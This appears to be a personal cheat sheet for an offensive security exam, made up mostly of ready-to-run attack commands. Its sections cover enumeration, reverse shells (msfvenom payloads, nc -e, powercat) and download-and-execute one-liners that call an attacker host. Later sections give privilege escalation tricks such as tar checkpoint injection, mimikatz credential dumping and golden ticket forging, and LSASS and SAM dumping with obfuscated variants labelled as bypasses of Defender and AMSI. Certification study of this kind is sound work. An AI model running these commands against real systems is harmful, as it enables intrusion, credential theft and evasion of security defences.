---
title: My Notes
date: 2024-05-23 07:00:00
updated: 2024-11-30 15:32:51
categories:
  - Notes
  - File Transfers
  - Privilege Escalation
  - Shells
  - Exploit
tags:
  - notes
  - enumeration
  - shells
  - exploitation
  - privsec
---

Notes for the Offensive Security Exam..

# Enumeration

---

### **Windows Enum**

<br>

#### Script Execution

---

```powershell
#bypass powershell default restriction, might alert av
powershell.exe -ep bypass
powershell.exe -noprofile -ep bypass -file .\find.ps1
```

<br>

#### Usernames and Groups

---

```powershell

#get local users ps
Get-LocalUser

#get local user cmd
net users


#get local group ps
Get-LocalGroup
Get-LocalGroupMember "Administrators"

#get local group cmd
net localgroup
net localgroup Administrators
```

- *Enumerate groups and memberships*

<br>

```powershell
# create a new user
net user foo password /add
net localgroup Administrators foo /add

# add new user to rdp group
Add-LocalGroupMember -Group "Remote Desktop Users" -Member foo
```

- *Create users and add to group*

<br>

#### Privileges

---

```powershell
whoami /all
whoami /priv
whoami /groups
```

<br>

#### Run As

---

```powershell
# interactive
runas.exe /user:domain\Administrator "C:\Windows\System32\cmd.exe"
runas.exe /netonly /user:domain\Administrator "C:\Windows\System32\cmd.exe"

#start as an admin
start-process PowerShell -verb runas

runas.exe /user:domain\Administrator /savecred "C:\Windows\System32\cmd.exe /c whoami"
Login-User -Identity "corp\foo" -Password "Str0ngP4ssw0rd@123"

#runas cmd
runas /user:admin cmd

```

- *Run as different user*

<br>

#### Credentials

---

```bash
# list local creds cmd
cmdkey /list
```

- [Cheat-Sheet](https://pscustomobject.github.io/powershell/howto/PowerShell-Create-Credential-Object/)

```powershell
#store creds inside $cred variable
$cred = get-credential 

#enter credential in the pop-up window
Invoke-Command -ComputerName mycomputer -ScriptBlock { Get-ChildItem C:\ } -credential $cred

$cred.GetNetworkCredential()|fl * to retrieve the username and password
```

<br>

#### Architecture and System

---

```powershell
systeminfo
echo %PROCESSOR_ARCHITECTURE%
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Network Card(s)" /C:"Hotfix(s)" /C:"Domain"

systeminfo | findstr /B /C:"Betriebssystemname" /C:"Betriebssystemversion" /C:"Systemtyp"

systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Network Card(s)" /C:"Hotfix(s)"

```

- *enumerate system-info*

```powershell
[System.Environment]::OSVersion.Version
(Get-CimInstance Win32_OperatingSystem).version
```

- *Get Build Version*

<br>

#### Network

---

```powershell
#List network interfaces
ipconfig /all

#display routing table 
route print

#Active network connections on the client
netstat -ano
```

- *Information about the network configuration*

<br>

#### Software and Processes

---

```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

- *Installed applications on the client*

```powershell
# list processes
get-process -IncludeUserName

# get processes related to a service
tasklist /SVC

# kill process
taskkill /f powershell.exe

# get all process members
Get-Process | Get-Member

# cleaned output
Get-Process -IncludeUserName | select Path, Name, Description

# get command lines processes
gcim win32_process | select path, commandline
```

- *Interact with processes*

<br>

#### Tasks

- [https://docs.microsoft.com/en-us/powershell/module/scheduledtasks/get-scheduledtask](https://docs.microsoft.com/en-us/powershell/module/scheduledtasks/get-scheduledtask)

```powershell
Get-ScheduledTask
schtasks /query /fo LIST /v

# filter to user tasks
Get-ScheduledTask -TaskPath "\Users\*"

Get-ScheduledTaskInfo
Get-ScheduledTaskInfo -TaskName <Full Path>

# list task based on a file
schtasks /query /fo LIST /v | Select-String "backup.exe"
```

- *get schedules task, query for backup.exe*

<br>

#### Services

- [https://mcpmag.com/articles/2014/12/12/service-information-using-powershell.aspx](https://mcpmag.com/articles/2014/12/12/service-information-using-powershell.aspx)

```powershell
# via sc
sc query type= service state= "Running"
sc queryex type= service
sc query state= all | find "SERVICE_NAME"
sc query "Service Name"

# check windows defender
sc query windefend

#powershell
Get-Service
Get-Service -Name WinRM | Select-Object *

#get running services
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

#powershell (old only)
Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}

# list service based on a file
wmic service list | Select-String "backup.exe"
```

- *list currently running services, search for a specific service*

<br>

#### SMB Shares

```powershell
Get-SmbShareAccess 
Get-SMBShare
```

- *get smb-shares in the network*

<br>

#### SNMP 161

- Enumerate the version of the service. It runs on SNMP and requires sudo to scan `sudo nmap -p 161 -sV <IP>`
- Try `snmpwalk` on the service and get all info about MIBs, check known MIBs (users, installed programs etc..)
- Try to get more information enumerating `NET-SNMP-EXTEND-MIB::nsExtendOutputFull`

```bash
#enum public information from snmp
snmpwalk -c public -v1 -t 10.10.10.10 NET-SNMP-EXTEND-MIB::nsExtendOutputFull
```

[Cheat-Sheet ](https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp)

<br>

#### Remote Desktop

```powershell
# check if enabled
Get-ChildItem -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\'
Get-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\'

# set
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\" -Name "fDenyTSConnections" -Value 0
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\" -Name "AllowRemoteRPC" -Value 1
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\" -Name "UserAuthentication" -Value 1

# open firewall
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
netsh advfirewall firewall set rule group="remote desktop" new enable=yes

# add users to the group
Add-LocalGroupMember -Group "Remote Desktop Users" -Member foo
net localgroup "Remote Desktop Users" foo /add

# add user foo & to local admin
net user add foo fooPa$$! /add
net localgroup "Administrators" foo /add

#restart rdp
Restart-Service -Force -Name "TermService"
```

- *enable RDP via registry*
- *adjust windows firewall*
- *add member to remote desktop users group*

<br>

#### Search for interesting files

---

```powershell
Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

- *search for potentially interesting files that contain PII*

```powershell
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini

#Find all those strings in config files.
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*` 

# Find all passwords in all files.
findstr /spin "password" *.*
findstr /spin "password" *.*
```

- *search for clear text passwords*

```powershell
#View Powershell History
Get-History

#Save complete history and print path
(Get-PSReadlineOption).HistorySavePath

#Read content
type C:\Users\foo\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

- *Get Powershell history and display it*

<br>

### **Active Directory**

#### General Domain Information

---

```powershell
#Retrieve FQDN
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# get trusts
nltest /domain_trusts ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships() get-adtrust -filter *
```

#### Usernames and Groups

---

```powershell
#get domain users
net user /domain

#retrieve ad properties of user foo
net user foo /domain

#get info about specific user or object
Get-ADUser -Identity "SQLService" -Properties * 
```

#### Enumeration with Powerview

---

```powershell
#load module
Import-Module .\PowerView.ps1

#Obtaining domain information
Get-NetDomain

#Querying users in the domain
Get-NetUser
```

- *query general information with Powerview*

```powershell
#get password last set & last logon
Get-NetUser | select cn,pwdlastset,lastlogon

#get membership of specific groups
Get-NetGroup "Support Administrators" | select member
```

- *Retrieve more detailed domain info with Powerview*

```bash
Find-LocalAdminAccess
# scans the network in an attempt to determine if our current user has administrative permissions on any computers in the domain

Get-NetSession -ComputerName files04 -Verbose #Checking logged on users with Get-NetSession, adding verbosity gives more info.
Get-NetUser -SPN | select samaccountname,serviceprincipalname # Listing SPN accounts in domain

Get-DomainUser -PreauthNotRequired -verbose # identifying AS-REP roastable accounts

Get-NetUser -SPN | select serviceprincipalname #Kerberoastable accounts

```

<br>

#### Kerbrute

---

```bash
kerbrute userenum -d corp.com --dc
172.16.5.5 /opt/jsmith-pass.txt 
#Enumerates users in a target Windows domain and automatically retrieves the AS for any users found that don't require Kerberos pre-authentication. Performed from a Linux-based host
```

<br>

### **Linux**

### **Web**

<br>

#### **Fuzzing**

[FFUF 101](https://github.com/tamimhasan404/FFUF-Tips-And-Tricks)

![Status Code for the Web](https://user-images.githubusercontent.com/66991901/106984127-2eeaf100-6791-11eb-8d98-da088f374a53.png)

*Status Code for the Web*

#### Filtering

---

**Option name: -ac**

```bash
./ffuf -w /root/Desktop/wordlist.txt -u http://FUZZ.ab.com -ac
```

- *filter out unnecessary sites like 401,403*

<br>

**Option name: -mc**

```bash
./ffuf -w /root/Desktop/wordlist.txt -u http://FUZZ.ab.com -mc 200,301
```

- *Match HTTP status codes, or "all" for everything (default: 200,204,301,302,307,401,403)*

<br>

**VHOST Discovery**

```bash
# Virtual host discovery (without DNS records)
ffuf -w /path/to/vhost/wordlist -u https://target -H "Host: FUZZ" -fs 4242
```

- *discover vhosts*

<br>

**Option name: -recursion**

```bash
./ffuf -w /root/Desktop/SecLists-master/Discovery/Web-Content/raft-large-directories.txt -u https://xyz.com/FUZZ -recursion
```

- *fuzz with recursion*

<br>

#### Extension

---

Option name: -e

```plaintext
./ffuf -w /root/Desktop/SecLists-master/Discovery/Web-Content/raft-large-directories.txt -u https://xyz.com/FUZZ -e .html,.php,.txt,.pdf
```

- *Sometimes it gives you valuable information. Which is maybe goldmine on your penetration testing/bug hunting.For this, you have to choose extension base on your target*

<br>

<br>
<br>

# Shells

### Windows

#### Revshells

---

```powershell
https://www.revshells.com/
```

- *great website that does most of the work for you*

<br>

#### Catch the shell using NC

---

```bash
nc -lvnp 9999
#listen on Port 9999
```

- *start a listener on Port 9999*
- *prefer to use stealthier ports, sometimes a firewall is in between *

<br>

#### Upload nc.exe to victim

---

```bash
cp /usr/share/windows-resources/binaries/nc.exe .
#copy to local directory

python3 -m http.server 8000
#serve the file 

powershell.exe -ep bypass 
#bypass script-block

IwR -Uri http://10.10.10.10:8000/nc.exe -Outfile nc.exe
#on victim machine, download nc.exe
```

- *quick way to upload nc.exe to victim machine*

<br>

#### MSFVenom

---

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=9999 -f exe -o revshell.exe

```

- *staged x64 reverse-shell using MSFVenom*

<br>

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.10.10 LPORT=9999 -f exe -o revshell.exe
```

- *stageless x64 reverse-shell using MSFVenom*

<br>

#### Nc and Ncat

---

```bash
nc.exe 10.10.10.10 9999 -e sh
#spawn the shell on victim machine

ncat.exe 10.10.10.10 9999 -e sh
#spawn the shell on victim machine
```

- *spawn revshell on victim machine*

<br>

### Linux

#### Revshells

---

```powershell
https://www.revshells.com/
```

- *great website that does most of the work for you*

<br>

#### Upgrade shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash");'
CTRL + Z         #backgrounds netcat session
stty raw -echo
fg               #brings netcat session back to the foreground
export TERM=xterm
```

<br>

#### Catch the shell using NC

---

```bash
nc -lvnp 9999
#listen on Port 9999
```

- *start a listener on Port 9999*
- *prefer to use stealthier ports, sometimes a firewall will block you*

<br>

# File Transfers

### **General**

<br>

#### wget

---

```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh

curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

- *download LinEnum.sh and execute and save it to /tmp*

#### Nc and NCAT

---

```bash
nc -nlvp 4444 > incoming.exe
nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe
nc -q 0 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe

## Kali
ncat --send-only 192.168.45.226 8000 < wget.exe
## Victim
ncat -l -p 8000 --recv-only > thefile

## Receive the file with BASH only
cat < /dev/tcp/192.168.45.226/443 > wget.exe
```

- *transfer files using nc and ncat*

#### Socat

---

```bash
sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt
socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create
type received_secret_passwords.txt
```

- *transfer files using socat*

#### Uploading files

---

```powershell
python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

- *python3 simple-httpserver*

<br>

```powershell
ruby -run -e httpd . -p 8000
```

- *ruby simple webserver to serve files*

<br>

```powershell
php -S localhost:8080
```

- *php simple webserver to serve files in current directory*

### **Windows**

#### Using wget

---

Download and Execute

```powershell
wget https://10.10.10.10:8000/PowerView.ps1 | iex

curl https://10.10.10.10:8000/PowerView.ps1 | iex
```

#### Powershell

---

```powershell
wget 10.10.10.10/remoteShell.exe -outfile stealthyshell.exe 

IwR -Uri http://10.10.10.10:8000/file.exe -Outfile file.exe | iex

Invoke-WebRequest https://10.10.10.10:8000/PowerView.ps1 | iex

IEX(New-Object Net.WebClient).DownloadString("http://10.10.10.10:8000/rev.ps1") | powershell -noprofile'

```

- *download reverse shell and execute it*

<br>

```powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.10.10:8000/PowerCat.ps1');
powercat -c 10.10.10.10 -p 4444 -e powershell"
```

- *Download powercat and open shell*

#### cmd

---

```plaintext
certutil.exe -urlcache -f http://10.10.10.10:Port/shell.exe bad.exe
```

#### WinRM / Powershell Remote

---

```bash
$Session = New-PSSession -ComputerName DATABASE01

#to our target
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\

#to our client
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

#### Via SMB

---

```bash
sudo impacket-smbserver [SHARE_NAME] [PATH_TO_SHARE]
```

- *With `impacket-smbserver`:*
  ```bash
  sudo impacket-smbserver share .
  ```
- *E.g. to server current directory:*
  ```bash
  copy \\[IP]\share\file
  ```
- *To copy from the share to a Windows client:*
  ```bash
  copy [FILE] \\[IP]\share
  ```
- *To copy to the share (i.e. exfiltrate a file):*

#### Powershell Simple HTTP-Server *File-Download*

---

[https://github.com/secure-77/powershell-http-server](https://github.com/secure-77/powershell-http-server)

```powershell
# server on port 8000
 ./webserver.ps1
Start-Webserver "http://+:8080/"
```

<br>

#### Unzip Files

---

```bash
#unzip
Expand-Archive C:\Windows\Public\Desktop\temp.zip -DestinationPath C:\Windows\Public\Desktop\temp
```

<br>

<br>
<br>

# Privilege Escalation

## **Windows PrivEsc**

---

### **Manual Privilege Escalation**

---

<br>

#### **Check Permissions**

```powershell
#list everything
whoami /all

#only show privileges
whoami /priv
```

- *SeImpersonatePrivilege? => System through Potato/PrintSpoofer*
- *Remote Desktop User? => RDP access should work, try to enumerate via GUI or use to Pivot*

<br>

#### **Check File Permissions**

```powershell
#Software that stands out
icacls "C:\xampp\"

```

- *look for Software where BuiltInUsers  have e.g. RX rights and potentially leverage to add a higher privileged user*

<br>

#### **Service Binary Hijacking**

```powershell
#get running services
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

#get services
Get-CimInstance -ClassName win32_service | Select Name, StartMode

#Check mysql service 
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
```

- *check for start up type of a service*

<br>

#### **Service DLL Hijacking**

```bash
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

Name                      State   PathName
----                      -----   --------
...
BetaService               Running C:\Users\foo\Documents\BetaServ.exe

```

- *check running services*

```bash
PS C:\Users\foo> icacls .\Documents\BetaServ.exe
.\Documents\BetaServ.exe NT AUTHORITY\SYSTEM:(F)
                         BUILTIN\Administrators:(F)
                         client\foo:(RX)
                         
Successfully processed 1 files; Failed processing 0 files
```

- *check permission of BetaServ.exe user foo can Read/Write and Execute*

- *if we replace betaserv.exe with a malicious doppelganger, we can restart the service and execute our malicious file to escalate privileges*

<br>

#### **Unquoted Service Paths**

```bash
Get-CimInstance -ClassName win32_service | Select Name,State,PathName

#wmi as alternative
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v ""

```

- *List of services with binary path*

### Automated Privilege Escalation

 **winPEAS**

---

winPEAS is part of the ***PEASS - Privilege Escalation Awesome Scripts SUITE*** and can be downloaded from Github [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS). 

There are 2 versions of winPEAS, a batch script and executable.

```powershell
REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1 t
```

- *if winPEASx64.exe doesnt show the color inside the ouput, try adding this regkey*

**LOLBAS**

---

Living Off The Land Binaries and Scripts (and also Libraries) [https://lolbas-project.github.io/#](https://lolbas-project.github.io/#)

```plaintext
git clone git@github.com:LOLBAS-Project/LOLBAS.git
```

<br>

<br>

## **Linux PrivEsc**

<br>

### Manual Privilege Escalation

---

<br>

#### Enumerate OS

---

```bash
#get kernel version
cat /etc/issue
#gather release information and more enhanced info
cat /etc/os-release
#kernel version in detail
cat /proc/version

#kernel version and architecture
uname -a 
```

- *enumerate Linux and its components*

<br>

#### Interesting  User trails

---

```bash
#print env variable
env
#show enviorment variable
echo $PATH

#check bashrc config
cat .bashrc

#check who has a bash shell
cat /etc/passwd | grep -i '/bin/.*sh'

#check sudo capabilities of the current user
sudo -l
```

<br>

#### Service Footprinting

---

```bash
#watch ps aux for a specific key word
watch -n 1 "ps -aux | grep pass"
```

<br>

#### Cron Jobs

---

```bash
#list crontab
cat /etc/crontab

#more detailed view
ls -l /etc/cron*

#grep Cronjobs which were executed since the machine is online
grep "CRON" /var/log/syslog

#abuse tar 
backup.tar.gz
#this will execute tar --checkpoint-action switch, once the tar cronjob runs
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > "--checkpoint=1"
shell.sh
```

#### Hijacking SUID binaries

---

```bash
#find suid that current user can run
find / -perm -4000 2>/dev/null
```

<br>

#### Hunt for interesting files permission

---

```bash
# all files owned by current user
find / -user `whoami` -type f -exec ls -la {} \; 2>/dev/null | grep -v '/proc/*\|/sys/*'

# readable /root
ls -la /root ; ls -l /home
```

<br>

### Automated Privilege Escalation

---

**linpeas.sh** is part of the ***PEASS - Privilege Escalation Awesome Scripts SUITE*** and can be downloaded from Github

[https://github.com/peass-ng/PEASS-ng](https://github.com/peass-ng/PEASS-ng)

```bash
./linpeas.sh 
```

- *execute linpeas*

# Post Exploitation

<br>

## **Mimikatz**

<br>

```plaintext
 .#####.   mimikatz 2.0 alpha (x86) release "Kiwi en C" (Apr  6 2014 22:02:03)
.## ^ ##.
## / \ ##  /* * *
## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
'## v ##'   https://blog.gentilkiwi.com/mimikatz             (oe.eo)
 '#####'                                    with  13 modules * * */

```

- *Mimikatz, a tool by gentilkiwi to extract secrets from a windows machine*

<br>

#### Enable logging, elevate token

---

```powershell
#enable logging in currenty directory
log

#get system, if not already
token::elevate
# try to find a da token and elevate to it
TOKEN::Elevate /domainadmin 

#interact with a process of another user
privilege::debug
```

<br>

#### Ask LSA for creds

---

```powershell

lsadump::lsa /patch
lsadump::sam /patch
lsadump::cache /patch
```

#### sekurlsa

---

```powershell
sekurlsa::logonpasswords

#export available tickets, similar to klist
sekurlsa::tickets /export

sekurlsa::pth /user:Administrateur /domain:corp.com /ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd
```

<br>

#### dump user hash

---

```powershell
lsadump::lsa /inject /name:krbtgt
```

- *dump krbtgt ntlm hash*

#### kerberos

---

```powershell
# show tickets of users
sekurlsa::tickets

#export tickets
kerberos::list /export

#list kerberos credentials for all authenticated users
SEKURLSA::Kerberos

#get NT HASH of krbtgt acc
lsadump::dcsync /user:corp.com\krbtgt 

#forge golden ticket using krbtgt hash
kerberos::golden /user:hacker
/domain:corp.com /sid:S-1-5-21-2806153819-209893948-922872689
/krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-
5-21-3842939050-3880317879-2865463114-519 /ptt

```

- *forge kerberos TGTs. golden ticket*

<br>

#### non interactive usage

---

```bash
.\mimikatz.exe "privilege::debug" "log hash.txt" "lsadump::lsa /patch" "exit"

.\mimikatz.exe  "privilege::debug" "sekurlsa::logonpasswords" "exit"
.\mimikatz.exe "privilege::debug" "lsadump::lsa /patch" "exit"
.\mimikatz.exe  "privilege::debug" "lsadump::sam /patch" "exit"
.\mimikatz.exe "privilege::debug" "lsadump::cache /patch" "exit"
```

- *use if you do not have a interactive shell*

## **SAM and AD Dumping**

<br>

#### Lolbins to potentially bypass Defender & AMSI

---

Procdump.exe, Privileges required User:

```shell
#Detected
procdump.exe -md calc.dll explorer.exe
#Bypass
procdump.exe -"m"d"e"d"w" calc.dll explorer.exe
```

Comsvcs.dll, privileges required according to documentation SYSTEM

```shell
#Detected
rundll32 C:\windows\system32\comsvcs.dll MiniDump [LSASS_PID] dump.bin full
#Bypass
rundll32 C:\windows\system32\comsvcs.dll MiniDump +[LSASS_PID] dump2.bin full
rundll32 C:\windows\system32\comsvcs.dll MiniDump 0[LSASS_PID] dump3.bin full
rundll32 comsvcs,`#65560 [LSASS_PID] dump4.bin full
rundll32 comsvcs,`#24 [LSASS_PID] dump5.bin full
rundll32 comsvcs,`#00024 [LSASS_PID] dump6.bin full
```

Dump.exe Privileges required Administrator

```shell
#detected 
dump64.exe [LSASS_PID] out.dmp
#Bypass
dump64.exe 0[LSASS_PID] out.dmp
```

TTTracer.exe Privileges required Administrator

```shell
#detected
TTTracer.exe -dumpFull -attach [LSASS_PID]
#bypass
TTTracer.exe —dumpFull —attach [LSASS_PID]

Source: https://www.unicodepedia.com/unicode/general-punctuation/2014/em-dash/
```

rdrleakdiag.exe privileges required, user

```shell
#detected
rdrleakdiag.exe /p [LSASS_PID] /o c:\evil /fullmemdmp /wait 1
#bypass
rdrleakdiag.exe /p [LSASS_PID] /o c:\evil /fullmemdmp /wait 1
```

Credentials dumping, Privileges required Administrator

```shell
#Detected
reg save HKLM\SECURITY c:\test\security.bak && reg save HKLM\SYSTEM c:\test\system.bak && reg save HKLM\SAM c:\test\sam.bak
#Bypass
reg save HKLM∖SECURITY c:∖test∖security.bak && reg save HKLM∖SYSTEM c:∖test∖system.bak && reg save HKLM∖SAM c:∖test∖sam.bak
#Bypass
reg save HKLM＼SECURITY c:＼test＼security.bak && reg save HKLM＼SYSTEM c:＼test＼system.bak && reg save HKLM＼SAM c:＼test＼sam.bak
```

#### Impacket-secretsdump

---

```bash
#Usage
impacket-secretsdump oscp.prep\foo:password@DC01

#If you have SAM and SYSTEM file, you can use secretsdump to read them 
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

- *dump sam using secretsdump*

<br>

#### NXC former CrackMapExec

---

```bash
     .   .
    .|   |.     _   _          _     _____
    ||   ||    | \ | |   ___  | |_  | ____| __  __   ___    ___
    \\( )//    |  \| |  / _ \ | __| |  _|   \ \/ /  / _ \  / __|
    .=[ ]=.    | |\  | |  __/ | |_  | |___   >  <  |  __/ | (__
   / /ॱ-ॱ\ \   |_| \_|  \___|  \__| |_____| /_/\_\  \___|  \___|
   ॱ \   / ॱ
     ॱ   ॱ

#dump sam on a Pwn3d machine
nxc smb  10.10.10.10 -u 'administrator' -p 'Sh0wAdminsL0ve' --local-auth --sam

Available Protocols to Own stuff with
  {rdp,ssh,smb,ftp,ldap,mssql,wmi,winrm,vnc}
#use ssh, smb, wmi,winrm to dump SAM

#Test code execution
nxc smb  10.10.10.10 -u 'administrator' -p 'Sh0wAdminsL0ve' -x 'dir' 

#remote enable rdp
sudo netexec smb 10.69.88.23 -u user -p password -M rdp -o ACTION=enable

#enumerate logged on users
nxc smb 172.16.5.125 -u user -p pass --loggedon-users

#enumerate shares
nxc smb 172.16.5.125 -u user -p pass --shares

#enumerate domain users
nxc smb 172.16.5.125 -u user -p pass --users
#enumerat domain groups
nxc smb 172.16.5.124 -u user -p pass --groups
```

<br>